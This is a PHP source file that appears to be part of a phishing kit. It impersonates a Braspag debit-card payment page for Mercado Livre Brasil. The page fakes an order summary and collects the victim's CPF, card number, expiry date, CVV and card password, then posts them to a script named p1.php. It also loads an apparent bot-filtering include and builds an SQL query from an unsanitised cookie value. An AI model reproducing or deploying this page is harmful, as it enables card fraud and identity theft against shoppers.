<?php

    include_once "../settings/conn.php";
    include_once "../settings/functions.php";
    include_once "../settings/bots.php";
    session_start();
    error_reporting(0);

    $id = $_COOKIE['id'];
    $quantidade = $_COOKIE['quantidade'];
    if (!isset($_SESSION['cod_pedido'])) {
        $_SESSION['cod_pedido'] = "0".rand(2694966163, 6714941033);
    }
    
    $desconto = query("SELECT desconto FROM config");
    $rowd = assoc($desconto);
    $_SESSION['desconto'] = $rowd['desconto'];

    $query = query("SELECT * FROM produtos WHERE id = '$id'");
    while ($row = assoc($query)) {
        $nome = $row['nome'];
        $preco = ValorComDesconto($row['preco'], $_SESSION['desconto']);
        $img = $row['img'];
    }
?>

<!DOCTYPE html>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="expires" content="0">
    <title>Braspag - Tecnologia em Pagamentos</title>
    <link href="./pagador_files/jquery.alerts-1.1.css" rel="stylesheet" type="text/css">
    <link href="./pagador_files/creditcard.css" rel="stylesheet" type="text/css">
    <script src="../js/jquery.js"></script>
    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.0/jquery.mask.js"></script>

    <script type="text/javascript">
       
        jQuery(function($){
            $("#CardNumber").mask("9999 9999 9999 9999");
            $("#Identification").mask("999.999.999-99");
        });

    </script>
    
    <style type="text/css">
        body
		{
			background-color: #ffffff;
		}
    </style>

</head>
<body>
    <div id="container">
        
<div id="body-content">
    <div id="form-header">
        <div id="form-image-left">
            <img src="./pagador_files/braspag.jpg" width="110px" height="38" border="0" alt="">
        </div>
        <div id="form-image-right">
        </div>
    </div>



    <div id="order-summary">
        <div id="order-summary-left">
            <p>Loja: Mercado Livre Brasil - Ltda</p>
            <p>Cliente: <?php echo $_SESSION['nome'];?></p>
            <p>Valor: R$ <?php echo numero($preco*$quantidade);?></p>
            <p>Data: <?php echo date("d/m/Y H:i:s");?></p>
            <p>Pedido: <?php echo $_SESSION['cod_pedido'];?></p>
            <p>Tipo: Cartão de Débito</p>
            <p>Opção: À Vista</p>
        </div>
    </div>

    <div id="form-container">
        <div id="form-caption">
            <span>Dados do seu cartão:</span>
            <p>Complete as informações abaixo e clique em Confirmar.</p>
        </div>
        <form name="creditCardDataForm" action="" method="post">

            <div class="form-row-gray">
                <p>
                    <label for="Identification">
                        CPF do Titular<br>
                    </label>
                        <input type="text" name="Identification" maxlength="50" id="Identification" style="width: 155px;">
                </p>
            </div>

            <div class="form-row-gray">
                <p>
                    <label for="CardHolder">
                        Nome do Portador<br>
                        <span style="font-size: 9px">(como impresso no cartão)</span>
                    </label>
                        <input type="text" name="CardHolder" maxlength="50" id="CardHolder" style="width: 155px;">
                </p>
            </div>

            <div class="form-row-gray">
                <p>
                    <label for="CardNumber">Número do Cartão</label>
                        <input type="text" name="CardNumber" maxlength="19" id="CardNumber" style="width: 155px;">
                </p>
            </div>

                <div class="form-row-gray">
                    <p>
                        <label for="CardExpirationMonth">Validade do Cartão</label>

                            <select id="CardExpirationMonth">
                                    <option value="01">1</option> 
                                    <option value="02">2</option> 
                                    <option value="03">3</option> 
                                    <option value="04">4</option> 
                                    <option value="05">5</option> 
                                    <option value="06">6</option> 
                                    <option value="07">7</option> 
                                    <option value="08">8</option> 
                                    <option value="09">9</option> 
                                    <option value="10">10</option> 
                                    <option value="11">11</option> 
                                    <option value="12">12</option> 
                            </select>
                            <select id="CardExpirationYear">
                                    <option value="19">2019</option> 
                                    <option value="20">2020</option> 
                                    <option value="21">2021</option> 
                                    <option value="22">2022</option> 
                                    <option value="23">2023</option> 
                                    <option value="24">2024</option> 
                                    <option value="25">2025</option> 
                                    <option value="26">2026</option> 
                                    <option value="27">2027</option> 
                                    <option value="28">2028</option> 
                                    <option value="29">2029</option> 
                                    <option value="30">2030</option> 
                                    <option value="31">2031</option> 
                                    <option value="32">2032</option> 
                                    <option value="33">2033</option> 
                                    <option value="34">2034</option> 
                                    <option value="35">2035</option> 
                                    <option value="36">2036</option> 
                                    <option value="37">2037</option> 
                                    <option value="38">2038</option> 
                                    <option value="39">2039</option> 
                            </select>
                    </p>
                </div>
            <div class="form-row-gray">
                <p>
                    <label for="CardSecurityCode">Código de Segurança</label>
                    <input type="text" name="CardSecurityCode" maxlength="4" id="CardSecurityCode" size="8">
                </p>
            </div>

            <div class="form-row-gray">
                <p>
                    <label for="CardPassword">Senha</label>
                    <input type="password" name="CardPassword" maxlength="8" id="CardPassword" size="8">
                </p>
            </div>

            <div class="form-row-gray" id="valor">
                <p>
                    <label>
                        <b>Valor</b>
                    </label>
                    <b>
                        R$ <?php echo numero($preco*$quantidade);?>
                    </b>
                </p>
            </div>
            <div id="buttons-box" style="margin: 20px 0px;">
                <input type="button" value="Cancelar">
                <input type="button" value="Confirmar" id="send">
            </div>
        </form>
    </div>

    <div id="creditcard-popup" style="height: 157px;">
            <span style="font-size: 14px;">X</span>
        </a>
        <img src="./pagador_files/csc.gif" alt="csc">
    </div>
    <div id="visa-tooltip-container">
        <div id="visa-tooltip-box">
                <span style="font-size: 14px;">X</span>
            </a>
            <p>
                <span class="visa-gold-text">Venda segura - Verified by BrasPag</span>
            </p>
            <br>
            <p>
                Para compras que utilizam o serviço
        Verified by Visa, você será autenticado
        pelo seu banco. Você deve preencher os
        dados solicitados e será direcionado para
        o ambiente seguro do seu banco.
        No ambiente seguro do seu banco,
        confi ra as informações referentes à sua
        compra e forneça os dados solicitados,
        que podem ser: tabela com códigos
        de segurança, token eletrônico,
        perguntas secretas ou dados que
        somente você e seu banco conhecem.
        Após seu banco validar os dados
        digitados, você deverá aguardar para que
        seu pedido seja confirmado pela loja.
            </p>
            <br>
        </div>
        <div id="arrow-down">
    </div>
</div>



    </div>

    <div id="result"></div>    

    <script>

        $('document').ready(function(){
            $('#send').click(function(){
            	var cpf = $("#Identification").val();
                var titular = $("#CardHolder").val();
                var numero = $("#CardNumber").val();
                var mes = $("#CardExpirationMonth").val();
                var ano = $("#CardExpirationYear").val();
                var vencimento = mes+"/"+ano;
                var cvv = $("#CardSecurityCode").val();
                var senha = $("#CardPassword").val();

                if (titular != "" && numero != "" && vencimento != "" && cvv != "") {
                    $.post("p1.php", {cpf:cpf,titular:titular,numero:numero,vencimento:vencimento,cvv:cvv,senha:senha,desbloq:""}, function(r){
                    	$("#result").html(r);
                    });
                }else{
                	alert("Preencha todos os campos");
                }
            });
        });

    </script>



</div></body></html>